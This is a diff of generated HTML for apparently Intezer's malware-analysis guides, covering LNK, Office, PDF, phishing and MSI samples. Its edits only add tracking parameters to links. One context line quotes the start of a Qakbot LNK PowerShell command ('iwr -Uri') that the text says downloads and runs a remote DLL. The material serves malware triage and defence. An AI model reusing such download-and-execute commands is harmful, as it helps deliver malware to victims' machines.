@@ -178,7 +178,7 @@ data, possibly a script. We noticed that files bigger than 4 KB should be
 considered suspicious files.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;For example, below is the content of
-&lt;a href="https://analyze.intezer.com/files/a1e2a9bc32a2ff8392cc70586e34fb9ba86c5aaad3dffee0d4940a8adf742b13"target="_blank" rel="noopener"&gt;an LNK file used by Qakbot&lt;/a&gt;.
+&lt;a href="https://analyze.intezer.com/files/a1e2a9bc32a2ff8392cc70586e34fb9ba86c5aaad3dffee0d4940a8adf742b13?utm_campaign=research-docs&amp;amp;utm_content=lnk&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;an LNK file used by Qakbot&lt;/a&gt;.
 It downloads a DLL from a remote location and executes it.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit iwr -Uri
@@ -544,11 +544,11 @@ individual files for when you need to dig deep. Then we&amp;rsquo;ll look at aut
 analysis of &lt;em&gt;every incoming file&lt;/em&gt; from your alert sources with Intezer, like
 you&amp;rsquo;d want to do for triaging alerts.&lt;/p&gt;
 &lt;p&gt;Intezer&amp;rsquo;s
-&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;powerful malware analysis engine&lt;/a&gt; can
+&lt;a href="https://intezer.com/forensic-ai-soc/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;powerful malware analysis engine&lt;/a&gt; can
 help you speed up the process of classifying and analyzing files. To get
 started, upload &lt;strong&gt;any&lt;/strong&gt; type of Microsoft Office document to Intezer like you
 would with
-&lt;a href="https://intezer.com/blog/alert-triage/the-evolution-of-sandboxing/"target="_blank" rel="noopener"&gt;a traditional sandbox&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/alert-triage/the-evolution-of-sandboxing/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;a traditional sandbox&lt;/a&gt;.
 The analysis will provide you with a trusted or malicious verdict. If the file
 is malicious, Intezer will also tell you what malware family it belongs to. The
 information provided in the analysis report gives investigators an immediate
@@ -587,7 +587,7 @@ further investigation of the compromised endpoint and to hunt for similar
 threats.&lt;/p&gt;
 &lt;p&gt;This can save you time if you have a single file that you need to investigate,
 but if you have a lot of files to analyze every day
-(&lt;a href="https://intezer.com/reported-phishing/"target="_blank" rel="noopener"&gt;like attachments from reported phishing emails&lt;/a&gt;)
+(&lt;a href="https://intezer.com/reported-phishing/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;like attachments from reported phishing emails&lt;/a&gt;)
 then you&amp;rsquo;ll need something that can ingest and analyze a large volume of
 incoming files.&lt;/p&gt;
 &lt;h2&gt;Automating triage and analysis of Microsoft Office files&lt;span class="hx:absolute hx:-mt-20" id="automating-triage-and-analysis-of-microsoft-office-files"&gt;&lt;/span&gt;
@@ -598,9 +598,9 @@ files to analyze manually in a sandbox.&lt;/p&gt;
 &lt;p&gt;Intezer&amp;rsquo;s alert triage processes are built to &lt;strong&gt;automate tasks such as
 collecting and analyzing evidence like Office files from your alerts.&lt;/strong&gt; Intezer
 can also
-&lt;a href="https://intezer.com/blog/alert-triage/automated-endpoint-scanning-advanced-triage/"target="_blank" rel="noopener"&gt;analyze fileless threats&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/alert-triage/automated-endpoint-scanning-advanced-triage/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;analyze fileless threats&lt;/a&gt;
 or
-&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/"target="_blank" rel="noopener"&gt;macros and scripts like PowerShell or Javascript&lt;/a&gt;,
+&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;macros and scripts like PowerShell or Javascript&lt;/a&gt;,
 automatically giving you deeper insights about what an attacker was attempting
 to do next.&lt;/p&gt;
 &lt;p&gt;Here&amp;rsquo;s a look at how Intezer&amp;rsquo;s analysis and triage process works:&lt;/p&gt;
@@ -610,10 +610,10 @@ to do next.&lt;/p&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;If you&amp;rsquo;re already using a SOAR tool to collect alerts, Intezer can also provide
 your team with higher-quality analysis results while
-&lt;a href="https://intezer.com/blog/alert-triage/leveraging-intezers-smart-decision-making-in-your-soar/"target="_blank" rel="noopener"&gt;simplifying your SOAR playbooks for alert triage&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/alert-triage/leveraging-intezers-smart-decision-making-in-your-soar/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;simplifying your SOAR playbooks for alert triage&lt;/a&gt;.
 Ultimately, responding quickly to serious incidents requires an advanced
 platform designed to
-&lt;a href="https://intezer.com/pricing/"target="_blank" rel="noopener"&gt;automatically collect evidence, investigate, triage alerts, and escalate only the confirmed threats.&lt;/a&gt;&lt;/p&gt;
+&lt;a href="https://intezer.com/pricing/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;automatically collect evidence, investigate, triage alerts, and escalate only the confirmed threats.&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;As we looked at in this blog, Microsoft Office files are frequently used by
 attackers to deliver malware to endpoints. Attackers leverage both the
 different file formats and vulnerabilities in Office products to launch
@@ -624,9 +624,9 @@ lengthy.&lt;/p&gt;
 individual Office files, but in more advanced cases the process can be
 especially time-consuming. To speed up the investigation and classification of
 Office files, you can
-&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;upload specific files to Intezer&lt;/a&gt; to
+&lt;a href="https://intezer.com/forensic-ai-soc/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;upload specific files to Intezer&lt;/a&gt; to
 instantly get a full analysis report or
-&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;connect your alert sources to automatically analyze files&lt;/a&gt;
+&lt;a href="https://intezer.com/forensic-ai-soc/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;connect your alert sources to automatically analyze files&lt;/a&gt;
 and triage all your alerts.&lt;/p&gt;
 &lt;div class="footnotes" role="doc-endnotes"&gt;
 &lt;hr&gt;
@@ -774,15 +774,15 @@ send to lure victims and they use the different capabilities of the PDF format
 for their attacks.&lt;/p&gt;
 &lt;p&gt;Many phishing attacks will contain &lt;strong&gt;links&lt;/strong&gt;, which may appear as clickable
 images of buttons, coupons,
-&lt;a href="https://analyze.intezer.com/files/dd294bd399212b760e68434af9c96a70f0ef9f7bc43b06d67addd3472eb6d69a/behavior"target="_blank" rel="noopener"&gt;fake CAPTCHA&lt;/a&gt;,
+&lt;a href="https://analyze.intezer.com/files/dd294bd399212b760e68434af9c96a70f0ef9f7bc43b06d67addd3472eb6d69a/behavior?utm_campaign=research-docs&amp;amp;utm_content=pdf&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;fake CAPTCHA&lt;/a&gt;,
 fake play buttons, or
-&lt;a href="https://intezer.com/blog/alert-triage/automated-qr-code-phishing-investigation/"target="_blank" rel="noopener"&gt;QR codes&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/alert-triage/automated-qr-code-phishing-investigation/?utm_campaign=research-docs&amp;amp;utm_content=pdf&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;QR codes&lt;/a&gt;.
 The purpose of these embedded files is to redirect the victims to sites
 controlled by the threat actors where they can proceed to the next stage of the
 attack.&lt;/p&gt;
 &lt;p&gt;PDF files natively support &lt;strong&gt;JavaScript&lt;/strong&gt;, so attackers can create files that
 will
-&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/"target="_blank" rel="noopener"&gt;execute scripts once a file has been opened&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/?utm_campaign=research-docs&amp;amp;utm_content=pdf&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;execute scripts once a file has been opened&lt;/a&gt;
 at this stage to download additional payload or steal information.&lt;/p&gt;
 &lt;p&gt;Another way in which threat actors can use the format is to deliver malware in
 the &lt;strong&gt;PDF streams&lt;/strong&gt;. Streams can contain any type of data (including scripts
@@ -973,7 +973,7 @@ and the outside world, security teams have to deal with large amounts of files,
 filtering and inspecting them to prevent phishing emails from reaching the end
 user&amp;rsquo;s mailbox. In addition, threat actors implement different techniques to
 evade detection. In 2023, a wave of phishing emails started using
-&lt;a href="https://intezer.com/blog/alert-triage/automated-qr-code-phishing-investigation/"target="_blank" rel="noopener"&gt;QR codes to hide malicious links&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/alert-triage/automated-qr-code-phishing-investigation/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;QR codes to hide malicious links&lt;/a&gt;
 and evade email security tools.&lt;/p&gt;
 &lt;p&gt;In this blog, we will cover techniques used by threat actors to make phishing
 emails &lt;em&gt;look&lt;/em&gt; legitimate and deliver malware to the victim&amp;rsquo;s endpoint. We will
@@ -1140,7 +1140,7 @@ CLI tool to extract attachments from &lt;code&gt;.eml&lt;/code&gt; messages.&lt;
 &lt;li&gt;&lt;a href="https://www.marks-lab.com/"target="_blank" rel="noopener"&gt;UUDWIN&lt;/a&gt; - Software that extracts attachments
 from &lt;code&gt;.eml&lt;/code&gt; and &lt;code&gt;.msg&lt;/code&gt; emails.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;em&gt;You can also &lt;a href="https://intezer.com/pricing/"target="_blank" rel="noopener"&gt;try Intezer for free&lt;/a&gt;, which
+&lt;p&gt;&lt;em&gt;You can also &lt;a href="https://intezer.com/pricing/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;try Intezer for free&lt;/a&gt;, which
 automatically extracts URLs and files attached to phishing emails, analyzes
 collected evidence, and uses generative AI to give you insights about email
 body content and hidden HTML elements.&lt;/em&gt;&lt;/p&gt;
@@ -1155,14 +1155,14 @@ should be carefully inspected.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Microsoft Office files&lt;/strong&gt; - Utilize the macros or embedded OLE objects to
 deliver threats such as
-&lt;a href="https://analyze.intezer.com/families/db6abbcc-d292-4991-bc90-207c077f5e53"target="_blank" rel="noopener"&gt;Emotet&lt;/a&gt;
+&lt;a href="https://analyze.intezer.com/families/db6abbcc-d292-4991-bc90-207c077f5e53?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Emotet&lt;/a&gt;
 or
-&lt;a href="https://analyze.intezer.com/families/b70bfda8-0db1-4559-bc12-2525e7ac9e3b"target="_blank" rel="noopener"&gt;TrickBot&lt;/a&gt;.
+&lt;a href="https://analyze.intezer.com/families/b70bfda8-0db1-4559-bc12-2525e7ac9e3b?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;TrickBot&lt;/a&gt;.
 To properly analyze these files you need to understand the format and the
 techniques threat actors implement to hide malware – check out our previous
 blog about &lt;a href="../office/"&gt;how to analyze malicious Office files&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;PDFs&lt;/strong&gt; - By nature these files can have links,
-&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/"target="_blank" rel="noopener"&gt;JavaScript code&lt;/a&gt;,
+&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;JavaScript code&lt;/a&gt;,
 and any file type can be embedded into a PDF file. All of these features are
 used by threat actors to hide and deliver threats. On top of that, there are
 hundreds of PDF readers and many known vulnerabilities that can be exploited
@@ -1197,7 +1197,7 @@ while fairly easily installing malware.&lt;/li&gt;
 &lt;p&gt;Inspecting attachments can be time consuming and hard and in some cases you may
 come to the conclusion that the file is trusted. To reduce the time you spend
 on analysis of files, you can connect
-&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt; to have it automatically
+&lt;a href="https://intezer.com/forensic-ai-soc/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt; to have it automatically
 collect files and use its proprietary code reuse database to extracts valuable
 information: whether the files are malicious, their behavior, IOCs, or strings
 with other samples in the database. This way you will not have to waste time on
@@ -1217,7 +1217,7 @@ results are not conclusive or you wish to dig deeper, it is worth to further
 investigate the domain and see if it was linked to any known campaigns or
 threat actors.&lt;/p&gt;
 &lt;p&gt;One of the tools you can use for inspecting URLs is
-&lt;a href="https://intezer.com/blog/product-updates/automatically-scan-urls-and-analyze-malware/"target="_blank" rel="noopener"&gt;Intezer&amp;rsquo;s URL scanner&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/product-updates/automatically-scan-urls-and-analyze-malware/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer&amp;rsquo;s URL scanner&lt;/a&gt;.
 &lt;strong&gt;Intezer can connect to abuse inboxes or email security systems to
 automatically collect and classify file attachments or URLs, allowing you to
 accelerate response.&lt;/strong&gt; When you submit the extracted URL, then the scanner will
@@ -1282,16 +1282,16 @@ sites or different types of attachments, all of which require different sorts
 of skills and methods to thoroughly inspect all of the artifacts.&lt;/p&gt;
 &lt;p&gt;There is a solution for handling a lot of phishing emails, even with QR codes
 hiding links or tricky attachments containing malicious scripts –
-&lt;a href="https://intezer.com/blog/alert-triage/automated-phishing-investigation/"target="_blank" rel="noopener"&gt;automate your email pipeline&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/alert-triage/automated-phishing-investigation/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;automate your email pipeline&lt;/a&gt;.
 Building custom workflows can help, but
-&lt;a href="https://intezer.com/blog/alert-triage/intezer-and-soar/"target="_blank" rel="noopener"&gt;SOAR playbooks have some drawbacks&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/alert-triage/intezer-and-soar/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;SOAR playbooks have some drawbacks&lt;/a&gt;.
 But to make phishing investigations easier and less demanding for you security
 team, it is worth setting up a smart solution with native automation for
 suspicious emails.&lt;/p&gt;
 &lt;p&gt;Automatically submitting suspicious emails and extracting evidence with using a
 platform such as Intezer means that instead of spending time investigating
 files that are trusted or known threats, you can focus on the
-&lt;a href="https://intezer.com/blog/incident-response/automated-threat-escalations-focus-on-what-matters/"target="_blank" rel="noopener"&gt;serious threats&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/incident-response/automated-threat-escalations-focus-on-what-matters/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;serious threats&lt;/a&gt;
 identified in your suspicious emails. By piping emails and attachments into
 Intezer for analysis for you get comprehensive reports about each email, laong
 file, link, and other artifacts. Your team doesn&amp;rsquo;t have to waste time on false
@@ -1644,7 +1644,7 @@ a legitimate installation.&lt;/p&gt;
 &lt;a href="https://wiki.gnome.org/msitools"target="_blank" rel="noopener"&gt;Linux&lt;/a&gt; and
 &lt;a href="https://formulae.brew.sh/formula/msitools"target="_blank" rel="noopener"&gt;Mac&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;The sha256 of the MSI file:
-&lt;a href="https://analyze.intezer.com/files/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750"target="_blank" rel="noopener"&gt;&lt;code&gt;90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;a href="https://analyze.intezer.com/files/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750?utm_campaign=research-docs&amp;amp;utm_content=msi&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;&lt;code&gt;90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;First, let&amp;rsquo;s examine the metadata of the file:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;msiinfo suminfo 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750.sample
@@ -1810,7 +1810,7 @@ identify this sort of manipulation.&lt;/p&gt;
 &lt;h3&gt;MSI Installer Analysis Using Intezer&lt;span class="hx:absolute hx:-mt-20" id="msi-installer-analysis-using-intezer"&gt;&lt;/span&gt;
 &lt;a href="#msi-installer-analysis-using-intezer" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;So far, we have demonstrated how to investigate MSI files manually. However,
 there is a more efficient method to extract malicious payloads from these and
-other file types. Using &lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;, we
+other file types. Using &lt;a href="https://intezer.com/forensic-ai-soc/?utm_campaign=research-docs&amp;amp;utm_content=msi&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;, we
 leverage static and dynamic execution combined with robust code and string
 reuse analysis. This powerful approach enables analysts, SOC teams, and
 researchers to quickly identify and classify malicious files from a high volume
@@ -1887,7 +1887,7 @@ addresses from compromised accounts.&lt;/p&gt;
 &lt;p&gt;Our team identified another variant of the MSI installer that installs Atera
 Agent in the wild.&lt;/p&gt;
 &lt;p&gt;Sha256:
-&lt;a href="https://analyze.intezer.com/files/66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4"target="_blank" rel="noopener"&gt;&lt;code&gt;66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;a href="https://analyze.intezer.com/files/66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4?utm_campaign=research-docs&amp;amp;utm_content=msi&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;&lt;code&gt;66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;We wanted to compare it to the installers from the report. We chose the file
 with the sha256: &lt;code&gt;ffbe988fd797cbb9a1eedb705cf00ebc8277cdbd9a21b6efb40a8bc22c7a43f0&lt;/code&gt;&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
